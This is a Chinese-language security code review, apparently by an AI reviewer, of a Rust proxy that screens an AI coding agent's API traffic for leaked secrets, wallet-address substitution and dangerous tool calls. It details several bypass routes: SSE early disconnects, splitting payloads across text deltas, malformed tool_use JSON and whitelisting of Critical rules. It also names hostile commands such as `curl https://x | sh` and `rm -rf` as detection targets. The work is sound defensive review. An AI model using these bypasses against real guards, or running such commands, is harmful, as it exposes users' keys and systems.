# Codex Review: Week 1-3 实装代码审查

> Reviewer: Codex (gpt-5.5, reasoning=xhigh)
> Date: 2026-04-27
> Scope: main@d7d84363cf56
> Files reviewed: 53 code/config files; fuzz/corpus 9,212 seeds enumerated

## 总评

当前实现能通过 `cargo fmt` 和严格 `clippy`，但安全语义没有达到 Week 3 的完成定义，阻塞 Week 4。最严重的问题是：BIP39 SHA-256 checksum 验证模块存在但没有接入真实出站扫描；入站 Critical 可以被 `.sieveignore` 永久绕过；地址替换检测没有把用户 prompt 中的地址纳入会话历史；SSE 提前断流、超长事件和 malformed tool_use 都存在 fail-open 或 OOM 风险。结论：Week 4 前必须先修 P0，否则后续危险 tool call、弹窗和 benchmark 都会建立在错误的安全边界上。

## P0 问题（必修）

### P0-1: BIP39 checksum 验证未接入生产扫描，真实助记词不会触发 OUT 规则

- **文件**：`crates/sieve-rules/rules/outbound.toml:179`
- **问题**：OUT-12 仍是占位 pattern，加载器和 adapter 没有替换占位，也没有在命中后调用 `bip39::verify_checksum`。

```toml
# crates/sieve-rules/rules/outbound.toml:188
# TODO(rules-engine-agent): 实现 bip39_pattern_from_wordlist() 在加载时替换占位符。
[[rules]]
id = "OUT-12"
pattern = '__BIP39_PREFILTER_PLACEHOLDER__'
severity = "critical"
```

`load_outbound_rules` 只是原样返回 TOML 规则：

```rust
// crates/sieve-rules/src/loader.rs:14
pub fn load_outbound_rules(path: &Path) -> SieveRulesResult<Vec<RuleEntry>> {
    let s = std::fs::read_to_string(path)?;
    let f: OutboundRulesFile = toml::from_str(&s)?;
    Ok(f.rules)
}
```

生产扫描路径也只走 vectorscan 命中：

```rust
// crates/sieve-cli/src/engine_adapter.rs:183
let hits = self.engine.scan(input.as_bytes())?;
```

测试还显式过滤掉 BIP39 占位规则：

```rust
// crates/sieve-rules/tests/outbound_rules.rs:40
.filter(|r| r.pattern != "__BIP39_PREFILTER_PLACEHOLDER__")
```

- **风险**：PRD §9 #4 被直接破坏。标准有效助记词如 `abandon ... about` 不会被 OUT 规则命中；无效助记词也没有“词表命中但 checksum 失败不得定级 Critical”的生产路径。
- **建议修复**：

```rust
// 建议方向：在 outbound adapter 中增加 BIP39 second pass，不依赖占位 regex 单独完成。
for window in candidate_bip39_windows(input) {
    let words: Vec<&str> = window.split_whitespace().collect();
    if sieve_rules::bip39::verify_checksum(&words, sieve_rules::wordlist::wordlist_index()) {
        detections.push(build_critical_detection("OUT-09", window, body_byte_offset));
    }
}
```

同时把规则 ID 对齐 PRD 的 `OUT-09`，加 daemon 级集成测试：有效 BIP39 必须 426；相同词数但 checksum 错误不得 Critical。

### P0-2: `.sieveignore` 可以永久绕过入站 fail-closed Critical

- **文件**：`crates/sieve-core/src/pipeline/inbound.rs:67`
- **问题**：入站 filter 对所有 Detection 无差别套 `.sieveignore`，包括 IN-CR-01 地址替换、IN-CR-02 危险 shell、IN-CR-05 签名工具调用。

```rust
// crates/sieve-core/src/pipeline/inbound.rs:67
fn filter_sieveignore(&self, dets: Vec<Detection>) -> Vec<Detection> {
    dets.into_iter()
        .filter(|d| !self.sieveignore.contains(&d.fingerprint))
        .collect()
}
```

该过滤同时用于文本与 tool_use：

```rust
// crates/sieve-core/src/pipeline/inbound.rs:122
Ok(self.filter_sieveignore(hits))

// crates/sieve-core/src/pipeline/inbound.rs:132
Ok(self.filter_sieveignore(hits))
```

测试甚至把 Critical `rm -rf` 被白名单压掉作为期望行为：

```rust
// crates/sieve-core/src/pipeline/inbound.rs:251
fn sieveignore_filters_known_fingerprint() {
    let fp = fingerprint("IN-CR-02", "rm -rf");
    ...
    assert!(hits.is_empty(), "sieveignore should suppress the detection");
}
```

拦截响应还引导用户把入站 Critical 加进 `.sieveignore`：

```rust
// crates/sieve-cli/src/daemon.rs:391
"请检查后用 .sieveignore 加入 fingerprint 白名单。"
```

- **风险**：破坏 PRD §9 #3 和 #8。攻击者只要诱导用户加入一次 fingerprint，YOLO mode 下签名、shell、地址替换 Critical 就可永久失效。
- **建议修复**：

```rust
fn filter_sieveignore(&self, dets: Vec<Detection>) -> Vec<Detection> {
    dets.into_iter()
        .filter(|d| d.severity == Severity::Critical || !self.sieveignore.contains(&d.fingerprint))
        .collect()
}
```

如果确实需要处理 Critical 误报，只能做一次性人工确认，不应写入持久 `.sieveignore`。删除响应中鼓励入站 Critical 白名单的 guidance，并添加测试：`.sieveignore` 命中 IN-CR-05-EVM 时仍必须阻断。

### P0-3: IN-CR-01 地址替换没有读取用户 prompt 地址，核心攻击场景漏报

- **文件**：`crates/sieve-core/src/pipeline/inbound.rs:94`
- **问题**：地址历史只从入站 `text_delta` 中学习，没有在转发前把 outbound request 的地址 seed 到 `SessionState`。

```rust
// crates/sieve-core/src/pipeline/inbound.rs:94
let addrs = extract_eth_addresses(text);
...
for addr in addrs {
    if let Some(orig) = check_substitution(&session.addresses_seen, &addr) {
        hits.push(Detection { rule_id: "IN-CR-01".into(), ... });
    }
    session.addresses_seen.insert(addr);
}
```

CLI 出站路径只做 secret 扫描，未把 `texts` 传给 AddressGuard：

```rust
// crates/sieve-cli/src/daemon.rs:158
let texts = anthropic_req.extract_text_content();
...
let hits = filter.process(&mut msg)?;
```

现有集成测试把“原始地址”伪造在上游响应第一个 delta 中：

```rust
// crates/sieve-cli/tests/inbound_block.rs:332
// 同一 SSE 流：第一个 event 植入原始地址，第二个 event 出现近似地址
```

这不是 PRD §4.2 的真实攻击：用户 prompt 地址 A，模型/中转站输出地址 B。

- **风险**：IN-CR-01 在真实 Claude Code 请求中基本漏掉首轮地址替换攻击，破坏 Week 3 P0 完成定义。
- **建议修复**：

```rust
impl InboundFilter {
    pub fn seed_known_addresses_from_text(&mut self, text: &str) -> SieveCoreResult<()> {
        let mut session = self.session.lock().map_err(|_| ...)?;
        for addr in extract_eth_addresses(text) {
            session.addresses_seen.insert(addr);
        }
        Ok(())
    }
}

// daemon.rs: 在 forward_with_inbound_inspection 前
for (_, text) in &texts {
    inbound_filter.seed_known_addresses_from_text(text)?;
}
```

补 daemon 集成测试：request body 中含地址 A，上游只输出地址 B，必须注入 `sieve_blocked`。

### P0-4: SSE 提前断流 flush 的命中被忽略，最后一个未闭合事件可绕过拦截

- **文件**：`crates/sieve-cli/src/daemon.rs:363`
- **问题**：主循环只对 `push_chunk()` 解析出的完整 event 做阻断；EOF 时 `parser.flush()` 虽然会解析残留 event，但返回的 detection 被丢弃。

```rust
// crates/sieve-cli/src/daemon.rs:363
let flushed = parser.flush();
for evt in &flushed {
    let _ = inbound_filter.observe_event(evt);
    if let Some(tool) = aggregator.process(evt) {
        let _ = inbound_filter.on_tool_use_complete(&tool);
    }
}
```

更严重的是，包含残留 event 的原始 frame 已经在主循环里透传给客户端：

```rust
// crates/sieve-cli/src/daemon.rs:351
let _ = tx.send(Ok(hyper::body::Frame::data(frame_bytes)));
```

- **风险**：破坏 PRD §9 #5 “提前断流”硬约束。恶意上游可以把最后一个 Critical tool_use 或危险 text_delta 不以 `\n\n` 结束；Sieve EOF 后发现但不阻断。
- **建议修复**：把 event 处理逻辑抽成共用函数，flush 分支必须执行同一套 blocking 决策；同时未闭合 event 的 bytes 不应先发给客户端。

```rust
let blocking = process_events(&mut inbound_filter, &mut aggregator, &flushed, dry_run)?;
if !blocking.is_empty() {
    let _ = tx.send(Ok(Frame::data(build_sieve_blocked_sse(&blocking))));
    return;
}
```

补测试：最后一个 `content_block_delta` / `content_block_stop` 缺少末尾空行时仍阻断。

### P0-5: SSE parser、tool_use aggregator 和代理通道均无上限，恶意上游可 OOM

- **文件**：`crates/sieve-core/src/sse/parser.rs:109`
- **问题**：多个请求处理路径存在无界累积。

SSE parser 的 event buffer 无上限：

```rust
// crates/sieve-core/src/sse/parser.rs:109
pub struct SseParser {
    buf: Vec<u8>,
}

// crates/sieve-core/src/sse/parser.rs:130
self.buf.extend_from_slice(bytes);
```

Aggregator 的 block map、text buffer、partial_json 都无上限：

```rust
// crates/sieve-core/src/tool_use_aggregator.rs:48
pub struct Aggregator {
    blocks: HashMap<u32, BlockState>,
}

// crates/sieve-core/src/tool_use_aggregator.rs:116
partial_json.push_str(incoming);
```

daemon 使用 unbounded channel：

```rust
// crates/sieve-cli/src/daemon.rs:285
let (tx, rx) =
    tokio::sync::mpsc::unbounded_channel::<Result<hyper::body::Frame<Bytes>, std::io::Error>>();
```

- **风险**：命中用户列出的 P0 “内存爆炸 / 单个 SSE event 无限 chunk OOM / 无界 HashMap 增长”。任意中转站或异常上游可以让本地代理内存持续增长。
- **建议修复**：

```rust
const MAX_SSE_EVENT_BYTES: usize = 1 << 20;
const MAX_TOOL_JSON_BYTES: usize = 1 << 20;
const MAX_OPEN_BLOCKS: usize = 32;
const INBOUND_CHANNEL_DEPTH: usize = 64;
```

超限必须返回结构化错误并 fail-closed 注入 `sieve_blocked`，不要降级为透传。`unbounded_channel` 改为 bounded `mpsc::channel(INBOUND_CHANNEL_DEPTH)` 并让 upstream read 受到背压。

### P0-6: malformed tool_use partial_json 解析失败后静默放行

- **文件**：`crates/sieve-core/src/tool_use_aggregator.rs:130`
- **问题**：已经识别到 `tool_use` block 后，如果 partial JSON 解析失败，aggregator 只 warn 并返回 `None`。daemon 只有在 `Some(tool)` 时才触发 `on_tool_use_complete`。

```rust
// crates/sieve-core/src/tool_use_aggregator.rs:130
match serde_json::from_str::<serde_json::Value>(&partial_json) {
    Ok(input) => Some(CompletedToolCall { id, name, input }),
    Err(e) => {
        tracing::warn!(..., "tool_use partial_json parse failed");
        None
    }
}
```

```rust
// crates/sieve-cli/src/daemon.rs:319
if let Some(tool) = aggregator.process(evt) {
    match inbound_filter.on_tool_use_complete(&tool) { ... }
}
```

- **风险**：破坏 PRD §9 #3 fail-closed High-Risk Tool Policy Gate。对安全代理来说，“看不懂 tool_use 参数”不能等价于“无风险”。
- **建议修复**：把 `Aggregator::process` 改成返回 `Result<AggregatorEvent, AggregatorError>`，至少区分 `Completed`、`MalformedToolUse`、`TooLarge`。只要已进入 `tool_use` 状态且最终无法解析，应生成 Critical block：

```rust
pub enum AggregatorEvent {
    Completed(CompletedToolCall),
    MalformedToolUse { id: String, name: String, raw_len: usize },
}
```

新增测试：`tool_use` block_stop 时 partial_json malformed，daemon 必须注入 `sieve_blocked`。

## P1 问题（应修）

### P1-1: 入站文本扫描不是 stream mode，跨 text_delta 切分可绕过规则

- **文件**：`crates/sieve-core/src/pipeline/inbound.rs:83`
- **问题**：每个 `TextDelta` 独立扫描，没有滚动窗口或 vectorscan stream state。

```rust
if let SseEvent::ContentBlockDelta { delta: SseDelta::TextDelta { text }, .. } = event {
    hits.extend(self.engine.scan_text(text, ContentSource::InboundAssistantText, 0)?);
    let addrs = extract_eth_addresses(text);
}
```

- **风险**：`curl https://x | sh`、Markdown exfil、`0x...` 地址都可跨 delta 切开绕过。架构文档要求 inbound pipeline 使用 vectorscan stream mode。
- **建议修复**：对每个 content block 维护 bounded rolling buffer，至少保留 `max_pattern_len - 1` overlap；或把 `InboundEngine` 扩展为真正的 stream scanner。

### P1-2: 出站规则集与 PRD OUT-01~12 不一致，校验型规则大多缺失

- **文件**：`crates/sieve-rules/rules/outbound.toml:25`
- **问题**：PRD §5.1 要求 OUT-04 JWT、OUT-07 Bitcoin WIF、OUT-08 Solana 私钥、OUT-10 Keystore JSON、OUT-12 数据库连接串等；当前 TOML 实际是 OpenAI/GCP/Slack/Discord 等通用 secret 规则，且 ID 含义已偏移。

```toml
# crates/sieve-rules/rules/outbound.toml:60
id = "OUT-04"
description = "GitHub PAT (ghp_/gho_/ghu_/ghs_/ghr_)"

# crates/sieve-rules/rules/outbound.toml:91
id = "OUT-06"
description = "JWT Token (eyJ...)"
```

`entropy_min`、`keywords` 字段也没有实际参与扫描决策：

```rust
// crates/sieve-rules/src/manifest.rs:33
pub entropy_min: Option<f32>,
pub keywords: Vec<String>,
```

adapter 只使用 regex 命中与 allowlist：

```rust
// crates/sieve-cli/src/engine_adapter.rs:202
let severity = rule.map(|r| map_severity(r.severity)).unwrap_or(Severity::Critical);
```

- **风险**：Crypto 专项出站检测没有达到 Week 2 定义；Critical FP/Recall 都无法按 PRD §6.5 评估。
- **建议修复**：先把 OUT ID 和 PRD 表对齐，再为 WIF/JWT/Keystore/BIP39 等实现二阶段 validity check。`entropy_min` 应在 `Detection` 生成前执行，不满足不得 Critical。

### P1-3: `dry_run` 仍能绕过未来新增的 Critical 规则

- **文件**：`crates/sieve-cli/src/daemon.rs:194`
- **问题**：当前决策是“fail-closed 清单内 Critical 永远 block，清单外 Critical 在 dry_run 下只记录”。

```rust
// crates/sieve-cli/src/daemon.rs:197
let blocking: Vec<&Detection> = all_detections.iter()
    .filter(|d| {
        if d.severity != Severity::Critical { return false; }
        sieve_rules::critical_lock::is_fail_closed(&d.rule_id) || !dry_run
    })
    .collect();
```

main 里也承认这一点：

```rust
// crates/sieve-cli/src/main.rs:145
"dry_run=true: non-fail-closed Critical detections will only be logged, NOT blocked."
```

- **风险**：PRD §9 #8 说 Critical 在所有版本不可关闭，不是“清单里的 Critical 不可关闭”。新增规则如果忘记加 `FAIL_CLOSED_RULES`，dry_run 会直接 fail-open。
- **建议修复**：`severity == Critical` 一律 block。`critical_lock` 只用于覆盖 manifest action，不应参与 dry_run 分支。

### P1-4: `/v1/messages` JSON 解析失败时直接透传原始 body

- **文件**：`crates/sieve-cli/src/daemon.rs:148`
- **问题**：只要 AnthropicRequest 反序列化失败，代理直接把 body 发给上游。

```rust
let anthropic_req: AnthropicRequest = match serde_json::from_slice(&body_bytes) {
    Ok(r) => r,
    Err(e) => {
        tracing::debug!("non-anthropic body, passing through: {e}");
        return forward_raw(forwarder, parts, body_bytes).await;
    }
};
```

- **风险**：畸形 JSON 中的 secret 会被发到外部上游，绕过出站扫描。即使上游最终 400，泄漏已经发生。
- **建议修复**：对 `/v1/messages` 解析失败采用 fail-closed 400/426，或至少对 raw UTF-8/body bytes 做 fallback secret scan 后再决定是否透传。

### P1-5: `inbound_filter` fuzz target 名不副实，没有实例化 InboundFilter 或规则引擎

- **文件**：`crates/sieve-core/src/fuzz_helpers.rs:31`
- **问题**：`fuzz_one_pipeline` 只跑 parser + aggregator，不跑 `InboundFilter::observe_event` / `on_tool_use_complete`，因此无法发现 Critical 被 `.sieveignore` 压掉、flush 命中被忽略、split text 绕过等语义问题。

```rust
pub fn fuzz_one_pipeline(data: &[u8]) {
    let mut parser = SseParser::new();
    let mut agg = Aggregator::new();
    for event in parser.push_chunk(data) {
        let _ = agg.process(&event);
    }
    for event in parser.flush() {
        let _ = agg.process(&event);
    }
}
```

- **风险**：PRD §9 #5 要的是 SSE 边界处理覆盖，不只是“不 panic”。当前 fuzz smoke test 通过不能证明 fail-closed 语义正确。
- **建议修复**：新增带 oracle 的 fuzz harness：parser → aggregator → InboundFilter，使用 mock engine 或最小真实规则集；遇到 signing/rm/curl/address seed corpus 时断言必须产生 Critical。

### P1-6: GitHub Actions 依赖使用 tag 而非 SHA pin

- **文件**：`.github/workflows/ci.yml:19`
- **问题**：CI / release 工作流使用 `actions/checkout@v4`、`Swatinem/rust-cache@v2`、`sigstore/cosign-installer@v3`、`softprops/action-gh-release@v2` 等 tag。

```yaml
- uses: actions/checkout@v4
- uses: Swatinem/rust-cache@v2
- uses: sigstore/cosign-installer@v3
```

- **风险**：PRD §9 #6 要自身供应链 sigstore + reproducible build + pinned deps。GitHub Action tag 可被上游 retag，严格意义上未 pin。
- **建议修复**：所有 third-party actions pin 到 commit SHA，并开启 Dependabot/renovate 专门更新 actions SHA；release workflow 保留 cosign 自验证。

## P2 建议（可推迟）

### P2-1: 默认规则路径依赖当前工作目录，不适合安装后的单二进制

- **文件**：`crates/sieve-cli/src/config.rs:138`
- **问题**：默认回退到 `crates/sieve-rules/rules/outbound.toml`，用户通过 brew/GitHub Release 启动时通常没有这个相对路径。
- **建议修复**：Week 4/5 将内置规则 `include_str!` 到二进制，外部 `rules_path` 只作为覆盖。

### P2-2: allowlist regex 每次命中都重新编译

- **文件**：`crates/sieve-rules/src/engine/mod.rs:88`
- **问题**：`Regex::new` 在 hot path 每次匹配时执行。
- **建议修复**：引入 `CompiledRuleEntry`，启动时预编译 allowlist regex，扫描时只执行 `is_match`。

### P2-3: 集成测试定位二进制路径较脆弱

- **文件**：`crates/sieve-cli/tests/outbound_block.rs:44`
- **问题**：测试手写查 `target/release/sieve` / `target/debug/sieve`，不使用 Cargo 提供的 `CARGO_BIN_EXE_sieve`。
- **建议修复**：改用 `env!("CARGO_BIN_EXE_sieve")`，减少 target dir、profile、workspace 布局变化导致的假失败。

## 测试覆盖评估

已执行命令：

- `cargo fmt --all -- --check`：通过
- `cargo clippy --workspace --all-targets --all-features --locked -- -D warnings`：通过
- `cargo test --workspace --locked`：未完成；`sieve-cli/tests/inbound_block.rs` 在当前沙箱绑定 `127.0.0.1:0` 被拒绝，5 个入站集成测试因 `PermissionDenied` 失败，不是业务断言失败
- `cargo test -p sieve-core --locked`：56 个单元测试 + 4 个 doctest 通过
- `cargo test -p sieve-rules --locked`：29 个单元测试 + 9 个 inbound 集成规则测试 + 12 个 outbound 集成规则测试通过
- `cargo +nightly fuzz run -s none sse_parser -- -runs=100`：通过，加载 5,059 个 corpus 文件
- `cargo +nightly fuzz run -s none tool_use_aggregator -- -runs=100`：通过，加载 2,083 个 corpus 文件
- `cargo +nightly fuzz run -s none inbound_filter -- -runs=100`：通过，加载 2,070 个 corpus 文件
- `cargo deny check`：未完成；当前环境 `/Users/doskey/.cargo/advisory-dbs/db.lock` 是只读路径，无法获取 advisory DB lock

主要盲区：

- 没有 daemon 级 BIP39 有效助记词阻断测试；现有规则测试显式排除 BIP39 占位规则。
- 没有 “prompt 地址 A → response 地址 B” 的 IN-CR-01 测试；现有测试只覆盖 response 内先 A 后 B。
- 没有 `.sieveignore` 不得压制 IN-CR-05 / IN-CR-02 Critical 的回归测试。
- 没有 SSE 提前 EOF 后仍执行 blocking 决策的测试。
- 没有超长单 event、超长 partial_json、过多 content block index、慢客户端背压的 OOM 回归测试。
- fuzz target 主要覆盖 crash/panic，不覆盖 fail-closed 语义 oracle。

## 总结

- P0 计数: 6
- P1 计数: 6
- P2 计数: 3
- 阻塞 Week 4 风险等级: High
- 建议下一步:
  1. 先修 P0-2 / P0-4 / P0-6，把所有 Critical 和无法解析的高风险 tool_use 改成 fail-closed。
  2. 修 P0-1，将 BIP39 checksum 二阶段验证接入生产出站路径，并补 daemon 集成测试。
  3. 修 P0-3，将 outbound prompt 地址 seed 到 InboundFilter 会话状态。
  4. 修 P0-5，加 SSE/tool_use/channel 上限与背压。
  5. 再补 P1 测试盲区，尤其 split text_delta、raw parse failure 和 fuzz semantic oracle。
